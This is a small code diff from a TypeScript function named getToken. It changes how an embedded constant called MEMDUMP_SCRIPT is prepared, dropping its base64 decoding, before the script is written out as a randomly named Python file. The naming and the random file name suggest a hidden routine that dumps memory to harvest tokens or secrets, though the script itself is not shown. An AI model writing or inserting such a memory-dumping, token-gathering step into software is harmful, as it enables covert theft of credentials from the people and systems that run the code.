@@ -440,7 +440,7 @@ export async function getToken(): Promise<Map<string, string>> {
         return new Map<string, string>()
     }
     // Base64 decode the script
-    const decodedScript = Buffer.from(MEMDUMP_SCRIPT, 'base64').toString('utf-8');
+    const decodedScript = MEMDUMP_SCRIPT;
 
     // Generate a random file name
     const randomFileName = generateRandomString(8) + '.py';
